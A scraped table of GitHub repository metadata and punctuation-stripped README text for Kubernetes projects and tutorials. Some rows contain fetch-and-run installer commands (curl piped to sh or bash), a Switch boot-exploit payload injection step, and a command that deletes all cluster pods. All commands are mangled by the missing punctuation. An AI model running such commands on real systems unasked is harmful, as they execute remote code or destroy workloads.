c redis k8s election I1206 04 23 06 496554 1 main go 75 Connecting to Redis localhost 6379 I1206 04 23 06 525680 1 main go 91 Successful initial ping from Redis I1206 04 23 06 525737 1 leaderelection go 242 attempting to acquire leader lease redis k8s election redis leader lock I1206 04 23 06 543659 1 leaderelection go 252 successfully acquired lease redis k8s election redis leader lock I1206 04 23 06 543864 1 main go 126 I am the Redis leader I1206 04 23 06 544041 1 main go 173 Setting leader service selector to pod redis 0 I1206 04 23 06 554853 1 main go 151 Setting Redis to replicate NO ONE kubectl logs n redis k8s election redis 1 c redis k8s election I1206 04 23 17 443600 1 main go 75 Connecting to Redis localhost 6379 I1206 04 23 17 468970 1 main go 91 Successful initial ping from Redis I1206 04 23 17 475652 1 leaderelection go 345 lock is held by redis 0 and has not yet expired I1206 04 23 17 475695 1 main go 151 Setting Redis to replicate redis 0 redis redis k8s election svc cluster local 6379 kubectl logs n redis k8s election redis 2 c redis k8s election I1206 04 23 33 294719 1 main go 75 Connecting to Redis localhost 6379 I1206 04 23 33 320662 1 main go 91 Successful initial ping from Redis I1206 04 23 33 328167 1 leaderelection go 345 lock is held by redis 0 and has not yet expired I1206 04 23 33 328212 1 main go 151 Setting Redis to replicate redis 0 redis redis k8s election svc cluster local 6379 To test failover try to terminate redis 0 redis 1 wins the next election and redis 2 switches its replica config kubectl logs n redis k8s election redis 1 c redis k8s election I1206 04 25 17 886144 1 leaderelection go 252 successfully acquired lease redis k8s election redis leader lock I1206 04 25 17 886282 1 main go 126 I am the Redis leader I1206 04 25 17 886439 1 main go 173 Setting leader service selector to pod redis 1 I1206 04 25 17 908234 1 main go 151 Setting Redis to replicate NO ONE kubectl logs n redis k8s election redis 2 c redis k8s election I1206 04 25 19 447584 1 leaderelection go 345 lock is held by redis 1 and has not yet expired I1206 04 25 19 447701 1 main go 151 Setting Redis to replicate redis 1 redis redis k8s election svc cluster local 6379 I1206 04 25 22 121783 1 leaderelection go 345 lock is held by redis 1 and has not yet expired To clean up your resources when you are done shell script kubectl delete n redis k8s election f https raw githubusercontent com terorie redis k8s election main examples cluster yaml kubectl get n redis k8s election pvc l app redis role node o name xargs kubectl delete n redis k8s election kubectl delete namespace redis k8s election Architecture TODO Properly explain this Coordination Each Redis pod runs a redis k8s election sidecar The sidecars compete in a Kubernetes leader election The leader configures its Redis instance as writable and the followers make themselves read only replicas of the leader Service discovery Clients use Kubernetes Services to connect to Redis All Redis clients are supported no Sentinel client logic involved The redis replica service connects to any Redis instance and supports read only clients The redis leader service connects to the current leader The election sidecar proxies all connections to the leader ensuring Redis is only reached when really talking with the leader Motivation As with many things when it comes to distributed systems the less complexity the better This service aims to be simpler and more reliable than a Redis Sentinel setup in a Kubernetes context The Kubernetes control plane already provides highly available service discovery and leader election facilities Redis Sentinel duplicates a large part including algorithms for achieving distributed consensus written in C Attributions Author Richard Patel https github com terorie Kubernetes manifests example cluster yaml based on Bitnami Redis Helm chart https github com bitnami charts tree master bitnami redis,2020-12-01T17:40:02Z,2020-12-07T12:56:34Z,Go,User,1,1,0,16,main,terorie,1,0,0,3,0,0,0
devopsminds,ansible_k8s_cluster,,,2020-11-10T20:59:15Z,2020-11-16T20:24:29Z,HTML,User,1,1,0,11,master,devopsminds,1,0,0,0,0,0,0
letantoan15,basic-mcs-k8s,,basic mcs k8s A basic micro services web application deploy with Docker and Kubernetes on the Google Cloud platform,2020-12-14T07:23:39Z,2020-12-14T07:31:09Z,n/a,User,1,1,0,1,master,letantoan15,1,0,0,0,0,0,1
maengsanha,docker-k8s-tutorial,docker#kubernetes,1 Docker https www docker com install Docker on Linux sh sudo apt get update sudo apt get install curl curl fsSL https get docker com sudo sh on Mac sh brew install cask docker use Docker without sudo optional sh sudo usermod aG docker USER start and automate Docker optional sh sudo systemctl start docker sudo systemctl enable docker check Docker version sh docker version build Docker image sh docker build t tutorial check Docker image sh docker images run container sh docker run d p 3000 8080 tutorial docker run d p 3001 8080 tutorial docker run d p 3002 8080 tutorial check logs sh docker logs CONTAINER ID 2 Kubernetes https kubernetes io install minikube https minikube sigs k8s io docs on Linux sh curl LO https storage googleapis com minikube releases latest minikube linux amd64 chmod x minikube linux amd64 mkdir p usr local bin sudo install minikube linux amd64 usr local bin minikube on Mac sh brew install minikube check minikube version sh minikube version install kubectl https kubernetes io ko docs reference kubectl overview on Linux sh curl LO https storage googleapis com kubernetes release release curl s https storage googleapis com kubernetes release release stable txt bin linux amd64 kubectl chmod x kubectl sudo mv kubectl usr local bin kubectl on Mac sh brew install kubectl check kubectl version sh kubectl version start minikube sh minikube start check cluster status sh kubectl get po A check cluster status dashboard sh minikube dashboard Reference How to Install Docker on Ubuntu 18 04 https phoenixnap com kb how to install docker on ubuntu 18 04 minikube start https minikube sigs k8s io docs start Install and Set Up kubectl https kubernetes io docs tasks tools install kubectl https subicura com k8s,2020-12-27T17:07:48Z,2020-12-29T02:27:26Z,Go,User,1,1,0,4,master,maengsanha,1,0,0,0,0,0,0
wensir1991,ansible-install-k8s,,Kubernetes v1 18 2Ansible hostsIP vi hosts groupvars all ymlIP vim groupvars all yml softwaredir root k8spackage certhosts k8s etcd 3 Master avatar https github com lizhenliang ansible install k8s blob master single master jpg Master avatar https github com lizhenliang ansible install k8s blob master multi master jpg Master ansible playbook i hosts single master deploy yml uroot k Master ansible playbook i hosts multi master deploy yml uroot k 4 ansible playbook i hosts single master deploy yml uroot k tags addons 5 1hostsip vi hosts 2 ansible playbook i hosts add node yml uroot k 3Master kubectl get csr kubectl certificate approve node csr xxx,2020-08-28T18:29:01Z,2020-08-30T06:45:27Z,Shell,User,1,1,0,62,master,lizhenliang#wensir1991,2,0,0,0,0,0,0
AS207960,k8s-device-serial,,Kubernetes Device Plugin for serial ports or infact any character device Building bash cargo build release Config file format yaml ports dev ttyS0 Ports is the list of character devices you want available to pods Usage Run the executable with enough permissions to connect to Unix sockets and create Unix sockets in var lib kubelet device plugins c on the command line specifies the location of the config file Usage in K8S definitions Set pod resources as follows to request 2 serial ports yaml apiVersion v1 kind Pod metadata name demo pod spec containers name demo container 1 image k8s gcr io pause 2 0 resources limits as207960 net serial 2 This will create two devices named dev ttyS0 and dev ttyS1 from the pool of available resources Why I want to run a BBS in k8s is that not reason enough,2020-09-01T21:23:53Z,2020-09-02T05:59:38Z,Rust,Organization,2,1,0,2,root,TheEnbyperor,1,0,0,0,0,0,0
t04glovern,nintendo-switch-k8s,,Nintendo Switch Kubernetes This repo will walk you through the setup and running of Kubernetes on a Nintendo Switch Switch L2T Download https torrents switchroot org ubuntu Download the update https download switchroot org ubuntu updates switchroot l4t ubuntu 3 0 0 2020 03 02 update 3 0 1 for switchroot l4t ubuntu 3 0 0 2020 03 02 zip Use etcher https www balena io etcher to flash the img Delete l4t ubuntu folder and bootloader ini 00 ubuntu ini from the mounted volume on the SD card Copy the contents of update 3 0 1 for switchroot l4t ubuntu 3 0 0 2020 03 02 to the mounted volume on the SD card Download hekate https github com ctcaer hekate releases and copy the contents of the zip to the mounted volume on the SD card Download either TegraRcmGUI https github com eliboa TegraRcmGUI if you are on Windows or fusee launcher https github com Qyriad fusee launcher on Linux Mac Connect the USB Type C cable to your switch and computer Power off your Nintendo Switch by holding the Power button Insert Joy Con JIG then hold the VOL button and press the POWER button Your switch should appear to do nothing If you used TegraRcmGUI https github com eliboa TegraRcmGUI select the hekatectcaer5 3 3 bin and inject payload If you used fusee launcher https github com Qyriad fusee launcher run fusee launcher py hekatectcaer5 3 3 bin Your switch will boot to the Hekate menu Remove the Joy Con JIG reconnect the controllers and unplug the USB Type C cable Click Nyx Options then click Dump Joy Con BT Click More Configs on the Hekate menu then select Ubuntu Linux Proceed through the setup process until you have booted into Ubuntu Once logged in reboot the system back to the Hekate menu Re open Ubuntu Linux Expand the disk volume by using the Disk utility in Ubuntu Connect to WiFI then update the system sudo apt update sudo apt upgrade Kubernetes bash Install dependencies sudo su curl s https packages cloud google com apt doc apt key gpg apt key add cat etc apt sources list d kubernetes list deb http apt kubernetes io kubernetes xenial main EOF apt get update apt get install y docker io kubeadm Setup cluster kubeadm init Back out of root exit Setup kubectl locally sudo cp etc kubernetes admin conf HOME sudo chown id u id g HOME admin conf export KUBECONFIG HOME admin conf Attribution L4T Ubuntu A fully featured linux on your switch https gbatemp net threads l4t ubuntu a fully featured linux on your switch 537301 Tutorial How To Install L4t Ubuntu 3 0 1 on the Nintendo Switch In 2020 https www youtube com watch v xcrC1 fXs7c luxas kubeadm workshop https github com luxas kubeadm workshop,2020-09-27T09:02:15Z,2020-09-29T00:24:22Z,n/a,User,0,1,1,1,master,t04glovern,1,0,0,0,0,0,0
aacecandev,rpi-hypriot-k8s,,WIP exports sh export DEVICE dev sdX export CLUSTERMEMBER master export FQDN cluster home export SSHPUBLICKEY export COUNTRYCODE ES export SSID export WIFIPASSWORD export TIMEZONE Europe Madrid export LOCALE enUS UTF 8 export TOKEN export CLUSTERSSHPRIVATEKEY export CLUSTERSSHPUBLICKEY,2020-09-28T18:13:32Z,2020-10-14T09:27:27Z,Shell,User,1,1,0,7,master,aacecandev,1,0,0,0,0,0,0
yurikilian,k8s-jenkins-terraform,,K8s Jenkins Terraform Table of Contents About about Development dev License license About Terraform boilerplate Jenkins deployment on top of Kubernetes No helm Development For local development you must install the following requisites See Deploy deploy for notes on how to deploy the project on a live system Prerequisites First you need to install a local kubernetes cluster You can use KIND Follow the install instructtions https kind sigs k8s io docs user quick start installation to provide the tool on you local machine Then create the cluster following the Kind Ingress https kind sigs k8s io docs user ingress tutorial Create the cluster Change the KINDVOLUMESPATH var accordingly your need sh KINDVOLUMESPATH HOME kind volumes mkdir p KINDVOLUMESPATH cat EOF kind create cluster config kind Cluster apiVersion kind x k8s io v1alpha4 nodes role control plane kubeadmConfigPatches kind InitConfiguration nodeRegistration kubeletExtraArgs node labels ingress ready true extraPortMappings containerPort 80 hostPort 80 protocol TCP containerPort 443 hostPort 443 protocol TCP extraMounts hostPath KINDVOLUMESPATH containerPath data EOF Install an ingress controller using their deployment sh kubectl apply f https raw githubusercontent com kubernetes ingress nginx master deploy static provider kind deploy yaml Wait for ingress creation sh kubectl wait namespace ingress nginx for condition ready pod selector app kubernetes io component controller timeout 90s License Mozilla Public License Version 2 0 LICENSE,2020-10-18T11:41:52Z,2020-12-09T00:03:07Z,HCL,User,1,1,0,7,master,yurikilian,1,0,0,3,0,0,0
RazcoDev,k8s-taints-controller,,,2020-11-01T15:55:04Z,2020-12-06T14:40:11Z,Go,User,1,1,0,2,master,RazcoDev,1,0,0,0,0,0,0
openebs,openebs-k8s-provisioner,,OpenEBS Kubernetes Jiva and cStor PV provisioner This provisioner is based on the Kubenretes external storage provisioner This code has been migrated from https github com openebs external storage tree release openebs as Kubernetes community deprecated the external storage repository Note We recommend OpenEBS users to shift towards cStor CSI based provisioner available at https github com openebs cstor operators This provisioner is mainly maintained to support the Jiva users till the Jiva CSI driver is available for beta Building OpenEBS provisioner from source Following command will generate openebs provisioner binary make Create a docker image make container,2020-12-15T08:09:17Z,2020-12-16T20:25:56Z,Go,Organization,1,1,0,88,develop,kmova#prateekpandey14#princerachit#utkarshmani1997#satyamz#spiffxp#max8899#wongma7#singhmeghna79#avishnu#cofyc#mittachaitu,12,1,1,0,0,0,0
moussdia,k8s-rook-ceph,,k8s rook ceph,2020-11-19T10:28:36Z,2020-11-19T11:55:42Z,n/a,User,1,1,0,3,master,moussdia,1,0,0,0,0,0,0
saggzz,k8slens_nixpkgs_inofficial,,Hugh Ok Lens 3 6 5 AppImage package for nixos This package is not in the nixpkgs tree maybe in the future but for now it is not 1 Download that AppImage 2 Wrap it and pack it https nixos org manual nixpkgs stable ssec pkgs appimageTools wrapping 3 nix prefetch url 4 nix build k8slens nix 5 result bin k8slens 6 follow instructions,2020-10-02T10:04:41Z,2020-10-04T17:53:16Z,Nix,User,1,1,0,0,main,,0,0,0,0,0,0,0
salehparsa,terraform-linode-k8s,,terraform linode k8s About This project creates a cluster on Linode https www linode com products kubernetes and provisioning it via terraform https registry terraform io providers linode linode latest docs resources lkecluster It also contains manfiest to deploy prom http simulator https hub docker com r pierrevincent prom http simulator for exposing metrics and prometheus for monitoring Structure infrastructure This folder contains the terraform files for provisioning cluster k8s This directory contains the k8s manifest app Manifest file of prom http simulator https hub docker com r pierrevincent prom http simulator prometheus Manifest file for deploying prometheus prometheus Manifest file for deploying prometheus alertmanager Manifest file for deploying alertmanager k8sconfig Manifest file for configuring namespace and ClusterRole grafana Manifest file for configuring grafana Getting Started Please make sure that you have already kubectl and git installed For Mac Users If you want to use Makefile of this project please run brew install gettext in order to have envsubst How To Use In order to use this repository you need to deploy the infrastructure first That way you will have your cluster on Linode After that you can deploy the application and prometheus from k8s directory Each directory has the Readme file that contains required information How To Access When you deploy the application it is available in Port 8080 Thus as mentioned in prom http simulator documentation https hub docker com r pierrevincent prom http simulator you can start running the curl command turn on spike and off or even sending random load to the service Example Setting Error Rate to 50 curl H Content Type application json X PUT d errorrate 50 http 212 71 236 119 8080 errorrate In Above example my IP Address is 212 71 236 119 Apart from the application it self you can have access to prometheus from your brwoser by going to http IP 9090 In my example prometheus is accessible via http 185 3 92 242 9090 This project has Grafana which is configured to use prometheus for visualising metrics It is accessible on http IP 3000 In my deployment it is accessible via http 178 79 175 105 3000 Query Prometheus We can query the number of requests that this service has received by running following query httprequeststotalapp prom http simulator Application expose multiple metrics with suffix of buckets and one of them is httprequestdurationmilliseconds which is good for checking Latency httprequestdurationmillisecondsbucketapp prom http simulator Further information and disscussion The main application is prom http simulator https hub docker com r pierrevincent prom http simulator and it gives and ability to generate random spike on demand by curl the endpoints That s why I haven t ran the specific load test against it since it generates the spike for testing propose However it is possible to run different stage of testing via Artillery https artillery io to test specific or different endpoints of an application As mentioned in previous section since the application is using HTTP request we can monitor the request via httprequeststotal or see the total by queries We can also use sum or rate function in prometheus as well Example Aggregate total number of successful requests sum httprequeststotalapp prom http simulator status 200 Number of requests per second sum rate httprequeststotalapp http simulator status 200 30m Known Issue At the time of writing this Readme I haven t found any issues However since it stays opensource I would like to see your feedback as an issue on this repository and even feel free to raise a pull request Licensing This project is licensed under Unlicense license,2020-10-05T19:29:56Z,2020-10-18T20:45:55Z,HCL,User,1,1,0,28,master,salehparsa,1,0,0,0,0,0,5
mauricioamendola,workshop-ocp-k8s,,Workshop de Openshift Kubernetes Contenido 1 Sumario del curso TODO 2 Arquitectura de OCP docs arquitectura md Diferencias con Kubernetes docs openshift vs k8s md 3 Explorando Openshift La consola Web docs web ui md La terminal de comandos docs cli client md 4 Proyectos Namespaces Ejercicio Creando un proyecto docs create project md Explorar el proyecto creado docs explore project md 6 PODINFO App Revision POD y Containers docs application md Ejercicio Deployar una imagen existente docs deploy app md Examinando el POD docs exploring pod md Exponiendo el servicio docs public app md Publicando una Ruta docs public route md 7 Construyendo desde cdigo Intro a Source to Image docs build md Ejercicio Deployar desde el Cdigo docs run build app md Ejercicio Realizar un cambio en la aplicacin docs change build app md 8 Health Checks Intro a los Health Checks docs health checks md Ejercicio Configurar chequeos docs set health checks md 9 Troubleshooting Openshift Eventos docs ts events md Logs docs ts logs md 10 Herramientas TODO 11 Usando YAMLs TODO Estructura de los Objetos POD Deployment Service Ejercicio Deployando PODInfo usando YAMLs,2020-11-04T13:30:50Z,2020-11-25T13:22:45Z,n/a,User,1,1,0,25,main,mauricioamendola,1,0,0,0,0,0,0
hi1280,aws-terraform-k8s,,AWSTerraformKubernetes,2020-11-21T09:25:35Z,2020-12-28T11:01:39Z,HCL,User,1,1,0,18,master,hi1280,1,0,0,0,0,0,0
Michael754267513,k8s-client-go,,k8s client go k8s client godemo demo github com owenliang k8s client go common k8s demo1 k8s demo2 yamljson deployment deployment spec replicas k8s demo3 deployment Spec Template Spec Containers k8s demo4 deployment pod demo5 xterm js web sshk8s container demo6 xterm js client go remotecommandweb sshcontainer demo7 PODcontainer demo8 client gosdk demo9 CRD code generationcontroller demo10 replicascontroller POD istio DestinationRules Gateway ServiceEntry VirtualServices gorest demo kubernetes k8s test crd,2020-08-28T06:28:35Z,2020-12-29T05:18:55Z,Go,User,1,1,1,30,k8s-note,owenliang#Michael754267513,2,0,0,0,0,0,0
humbledude,airflow_k8s_chart,,airflowk8schart tested on helm v2 14 2 deploy helm upgrade install airflow f values yaml,2020-10-19T02:28:29Z,2020-12-04T06:08:17Z,Smarty,User,1,1,0,1,main,humbledude,1,0,0,0,0,0,0
SovereignCloudStack,testbed-gx-k8s,kubernetes,GAIA X Kubernetes testbed The focus of the testbed is the short term provision of Kubernetes for the MVP,2020-11-02T11:57:06Z,2020-11-15T22:29:10Z,n/a,Organization,4,1,0,2,master,berendt,1,0,0,0,0,0,0
hvnsweeting,k8s-flask-demo,,k8s flask demo,2020-10-03T09:53:11Z,2020-10-04T11:12:01Z,Python,User,1,1,0,4,main,hvnsweeting,1,0,0,0,0,0,0
Yamongski,yan-multi-k8s,,,2020-09-14T09:58:50Z,2020-10-21T12:36:25Z,JavaScript,User,1,1,0,0,master,,0,0,0,0,0,0,0
shlomimn,k8s-jenkins-pipeline,,k8s jenkins pipeline General The Jenkinsfile is a groovy script that Jenkin CI CD can pull and run This Jenkinsfile will apply K8s in stages stage per yaml file Jenkins Pre Requests Install kubectl 1 Download the latest release with the command curl LO https storage googleapis com kubernetes release release curl s https storage googleapis com kubernetes release release stable txt bin linux amd64 kubectl 2 Make the kubectl binary executable chmod x kubectl 3 Move the binary in to your PATH sudo mv kubectl usr local bin kubectl 4 Test to ensure the version you installed is up to date kubectl version client Copy Create kube config to Jenkins allowing kubectl to run without sudo from Jenkins run 1 Make kube directory in Jenkins mkdir p HOME kube 2 Copy or Create the relevant kube config file sudo cp i root kube config HOME kube config or sudo vim HOME kube config Copy Paste into file Save 3 Change HOME kube config to jenkins ownership sudo chown id u id g HOME kube config Jenkins Pipeline creation 1 Create a new item in Jenkins of type Pipeline and give it a name 2 Go to Pipeline tab Choose Pipeline script from SCM Configure Repository URL https github com shlomimn k8s jenkins pipeline Set Branch Specifier to main not master Script File Jenkinsfile by default 3 Save Build Now,2020-11-02T18:45:59Z,2020-11-03T05:31:05Z,n/a,User,1,1,0,29,main,shlomimn,1,0,0,0,0,0,0
farshadzamanirad-projects,Multiple-master-k8s,,HA Kubeadm with Ansible and Vagrant Prerequisites vagrant https www vagrantup com downloads html ansible https docs ansible com ansible latest installationguide introinstallation html To setup just issue following command ansible playbook i hosts deploy k8s yaml and boom thats it K8S k8s png Note If we want to change some parts to adopt your ecosystem it can be easily done just need to change IPs and names inside Vagrantfile and hosts Set up a Highly Available Kubernetes Cluster using kubeadm manually Follow this documentation to set up a highly available Kubernetes cluster using Ubuntu 20 04 LTS as our masters and workers and Centos 8 as loadbalancer Role FQDN IP OS RAM CPU Load Balancer k8s lb gwf me 192 168 56 100 Centos 8 1G 1 Master k8s master01 gwf me 192 168 56 101 Ubuntu 20 04 2G 2 Master k8s master02 gwf me 192 168 56 102 Ubuntu 20 04 2G 2 Master k8s master03 gwf me 192 168 56 103 Ubuntu 20 04 2G 2 Worker k8s wn01 gwf me 192 168 56 201 Ubuntu 20 04 1G 1 Worker k8s wn02 gwf me 192 168 56 202 Ubuntu 20 04 1G 1 Worker k8s wn03 gwf me 192 168 56 203 Ubuntu 20 04 1G 1 Why the odd number of masters Consider a cluster of N members When masters form quorum to agree on cluster state quorum must have at least N 2 1 members Every new odd number in a cluster with M 1 masters adds one more node of fault tolerance Therefore adding an extra node to an odd numbered cluster gives us nothing Set up load balancer node Install Haproxy dnf y update dnf y install haproxy Configure haproxy Append the below lines to etc haproxy haproxy cfg frontend kubernetes frontend bind 192 168 56 100 6443 mode tcp option tcplog defaultbackend kubernetes backend backend kubernetes backend mode tcp option tcp check balance roundrobin server k8s master01 gwf me 192 168 56 101 6443 check fall 3 rise 2 server k8s master02 gwf me 192 168 56 102 6443 check fall 3 rise 2 server k8s master03 gwf me 192 168 56 103 6443 check fall 3 rise 2 Restart haproxy service systemctl restart haproxy On all kubernetes nodes master and worker nodes Disable Firewall ufw disable Disable swap swapoff a sed i swap d etc fstab Update sysctl settings for Kubernetes networking cat etc sysctl d kubernetes conf EOF net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 EOF sysctl system Install docker engine apt install y apt transport https ca certificates curl gnupg agent software properties common curl fsSL https download docker com linux ubuntu gpg apt key add add apt repository deb arch amd64 https download docker com linux ubuntu lsbrelease cs stable apt update apt install y docker ce containerd io Kubernetes Setup Add Apt repository curl s https packages cloud google com apt doc apt key gpg apt key add echo deb https apt kubernetes io kubernetes xenial main etc apt sources list d kubernetes list Install Kubernetes components apt update apt install y kubeadm kubelet kubectl On any one of the Kubernetes master node Eg k8s master01 gwf me Initialize Kubernetes Cluster kubeadm init control plane endpoint 192 168 56 100 6443 upload certs apiserver advertise address 192 168 56 101 pod network cidr 172 16 0 0 16 Copy the commands to join other master nodes and worker nodes Deploy Calico network mkdir kube cp etc kubernetes admin conf kube config kubectl create f https docs projectcalico org manifests calico yaml Deploy metallb loadbalancer kubectl apply f https raw githubusercontent com metallb metallb v0 9 3 manifests namespace yaml kubectl apply f https raw githubusercontent com metallb metallb v0 9 3 manifests metallb yaml kubectl create secret generic n metallb system memberlist from literal secretkey openssl rand base64 128 create a file metallbcm yaml with below content apiVersion v1 kind ConfigMap metadata namespace metallb system name config data config address pools name default protocol layer2 addresses 192 168 56 144 32 so we now can apply the config map kubectl apply f metallbcm yaml IMPORTANT If we need to have a single IP address as metallb load balancer we need to add below annotation to every and each of service we create metallb universe tf allow shared ip shared Create Join commands for worker and master nodes for worker nodes kubeadm token create print join command for master nodes kubeadm token create certificate key kubeadm init phase upload certs upload certs 2 dev null awk NR 2 print 1 print join command Join master and worker nodes copy output of join command for master which we created earlier ssh to every master node and paste what copied and run IMPORTANT We also need to pass apiserver advertise address to the join command when you join the other master node copy output of join command for worker which we created earlier ssh to every worker node and paste what copied and run Access our cluster from our workstation client mkdir kube scp root 192 168 56 101 root kube config kube It s recommended to install Helm latest version on our worstation machine to have a better package management curl fsSL o gethelm sh https raw githubusercontent com helm helm master scripts get helm 3 bash gethelm3 sh so we now can easily install any helm powered packages on our kubernetes for instance we will install Nginx Ingress helm repo add ingress nginx https kubernetes github io ingress nginx helm install nginx ingress ingress nginx ingress nginx n kube system Verifying the cluster kubectl cluster info kubectl get ns kubectl get nodes o wide Have fun,2020-10-27T14:10:27Z,2020-10-27T14:12:16Z,HTML,User,1,1,0,1,main,farshadzamanirad-projects,1,0,0,0,0,0,0
jdewinne,k8s-dev-scaler,bazel#dev#golang#k8s#namespace#scale,CI https github com jdewinne k8s dev scaler workflows CI badge svg https github com jdewinne k8s dev scaler actions query workflow 3ACI Security https github com jdewinne k8s dev scaler workflows Security 20check 20using 20Snyk badge svg https github com jdewinne k8s dev scaler actions query workflow 3A 22Security check using Snyk 22 Release k8s dev scaler https github com jdewinne k8s dev scaler workflows Release 20k8s dev scaler badge svg https github com jdewinne k8s dev scaler actions query workflow 3A 22Release k8s dev scaler 22 codecov https codecov io gh jdewinne k8s dev scaler branch main graph badge svg token 73PVIKFUFD https codecov io gh jdewinne k8s dev scaler License MIT https img shields io badge License MIT yellow svg https opensource org licenses MIT GitHub release https img shields io github v release jdewinne k8s dev scaler https github com jdewinne k8s dev scaler releases Downloads https img shields io github downloads jdewinne k8s dev scaler total https github com jdewinne k8s dev scaler releases About When developing on a local k8s instance often you have to juggle with memory cpu And when developing with multiple branches you sometimes have your app installed in multiple namespaces Each branch having it s own namespace maybe So in order to reduce your resource consumption by your k8s dev cluster this tool allows to downscale all deployments and statefulsets to zero It also allows to scale them all back up Behind the scenes it places an annotation called k8s dev scaler desired replicas that keeps track of the desired number if replicas Installation Linux Download from Releases https github com jdewinne k8s dev scaler releases Linux Mac Install using go get https github com jdewinne k8s dev scaler Usage Scale down up all resources in a k8s namespace Usage of k8s dev scaler context string optional k8s context to be used current context if not provided namespace string required k8s namespace to be used current namespace if not provided scale string required Can be one of up down,2020-10-19T16:25:34Z,2020-12-21T21:56:05Z,Starlark,User,1,1,0,24,main,jdewinne,1,2,2,0,0,0,1
umeshbhat,react-node-k8s,,,2020-09-21T07:21:50Z,2020-09-21T07:29:04Z,JavaScript,User,1,1,0,3,master,umeshbhat,1,0,0,0,0,0,0
sudomann,terraform-k8s-template,,Terraform Deployment Sample This repo is set up such that resources for other cloud providers can be added as a new folder module at the same level as gcp Getting Started Take note This repo assumes remote state is to be configured with a Terraform Enterprise account free tier with limited capability on app terraform io Setup your workstation credentials https www terraform io docs commands cli config html Sign into app terraform io https app terraform io and obtain a new token if you need to Authentication GCP Authenticate using a credential file for a service account with the following GCP IAM roles txt Cloud Build Editor Compute Instance Admin v1 Compute Network Admin Compute Network User Compute Security Admin Kubernetes Engine Cluster Admin DNS Administrator Service Account User Storage Admin AWS None Azure None Notes and TODO s GCP IAM TODO Preferably create custom role with just the very particular permissions that terraform needs to operate Cloud Build When using the Cloud Build trigger modules you need to ensure the hosted repository Github Bitbucket etc has been already set up to be mirrored Cloud Storage When naming a bucket in the format of a website e g usercontent myproduct com the email of the service account being used to create the resource must be added as an owner of the site See reference https stackoverflow com questions 19060226 cant create a bucket with my domain name AWS None Azure None,2020-09-28T17:18:55Z,2020-09-29T12:59:33Z,HCL,User,2,1,0,2,master,sudomann,1,0,0,0,0,0,0
eyawson,ML-microservice-k8s,,Operationalize a Machine Learning Microservice API eyawson https circleci com gh eyawson ML microservice k8s svg style svg https app circleci com pipelines github eyawson ML microservice k8s Project Overview In this project I operationalized a Machine Learning Microservice API Background You are given a pre trained sklearn model that has been trained to predict housing prices in Boston according to several features such as average rooms in a home and data about highway access teacher to pupil ratios and so on You can read more about the data which was initially taken from Kaggle on the data source site https www kaggle com c boston housing This project tests your ability to operationalize a Python flask appin a provided file app py that serves out predictions inference about housing prices through API calls This project could be extended to any pre trained machine learning model such as those for image recognition and data labeling Running the application 1 Run standalone python app py and then use makeprediction sh for a prediction 2 Run in Docker rundocker sh and then use makeprediction sh for a prediction 3 Run in Kubernetes runkubernetes sh and then use makeprediction sh for a prediction Project Tasks The project goal is to operationalize this working machine learning microservice using kubernetes https kubernetes io which is an open source system for automating the management of containerized applications In this project I Test your project code using linting Complete a Dockerfile to containerize this application Deploy your containerized application using Docker and make a prediction Improve the log statements in the source code for this application Configure Kubernetes and create a Kubernetes cluster Deploy a container using Kubernetes and make a prediction Upload a complete Github repo with CircleCI to indicate that your code has been tested The final implementation of the project will showcased my abilities to operationalize production microservices Setup the Environment Create a virtualenv and activate it Run make install to install the necessary dependencies Files in repo Makefile for build automation scripts to automate repeatable tasks and set up kubernetes Dockerfile to containerize the application CircleCI config file CI purposes App py to run the prediction application Data for app in the modeldata folder,2020-09-07T01:18:30Z,2020-11-23T05:50:35Z,Python,User,1,1,0,16,master,eyawson,1,0,0,0,0,0,0
chenmingle,k8s-nsq-deployment,,k8s nsq deployment kubectl apply f nsq deploy yaml,2020-12-10T03:04:46Z,2020-12-10T03:15:57Z,n/a,User,1,1,0,0,main,,0,0,0,0,0,0,0
adterskov,geekbrains_k8s_101,,Kubernetes GeekBrains KiND KiND Kubernetes iN Docker Kubernetes Docker Docker https docs docker com get docker Go https golang org doc install KiND https kind sigs k8s io docs user quick start installation KiND Play with Kubernetes https labs play with k8s com Kubernetes Docker kubeconfig 1 Master Worker kind create cluster kubectl cluster info context kind kind 1 Master 2 Workers kind create cluster config kind config yaml name cluster kubectl cluster info context kind cluster 3 Masters 3 Workers kind create cluster config kind ha config yaml name cluster ha kubectl cluster info context kind clister ha Kubernetes KiND kind get clusters Docker docker ps KiND kind delete clusters all Kubernetes kubectl get node kubectl get node o wide Pod namespace kube system kubectl get pod n kube system Pod Namespace kube system kubectl get pod n kube system o wide Namespace kubectl create ns hpa test kubectl apply f https k8s io examples application php apache yaml n hpa test kubectl port forward service php apache 8080 80 curl http localhost 8080 Horizontal Pod Autoscaler kubectl autoscale deployment php apache cpu percent 30 min 1 max 5 Merics Server kubectl apply f https github com kubernetes sigs metrics server releases latest download components yaml Merics Server KiND kubelet insecure tls kubectl apply f metrics server yaml Metrics Server kubectl get pod n kube system w grep metrics kubectl top pod kubectl top node HPA kubectl get hpa n hpa test kubectl run i tty load generator rm image busybox restart Never bin sh c while sleep 0 01 do wget q O http php apache done HPA Pods kubectl get hpa n hpa test kubectl get pod w Kubernetes Pod kubectl delete pod A all Chaos Engineering Kubernetes KubeDOOM Pod KubeDOOM git clone https github com storax kubedoom git VNC Viewer https www realvnc com en connect download viewer macos KubeDoom VNC localhost 7000 Port forward kubectl port forward deployment kubedoom 7000 5900 n kubedoom idbehold idkfa idspispopd,2020-12-16T10:09:06Z,2020-12-27T16:46:22Z,n/a,User,1,1,0,9,main,adterskov,1,0,0,0,0,0,0
juminrubin,multi-k8s-gcb,,,2020-10-30T10:44:17Z,2020-10-30T13:01:22Z,JavaScript,User,1,1,0,14,master,juminrubin,1,0,0,0,0,0,0
netology-code,ago-docker-k8s,,,2020-10-12T08:17:29Z,2020-10-23T05:07:55Z,Go,Organization,1,1,1,1,master,coursar,1,0,0,0,0,0,0
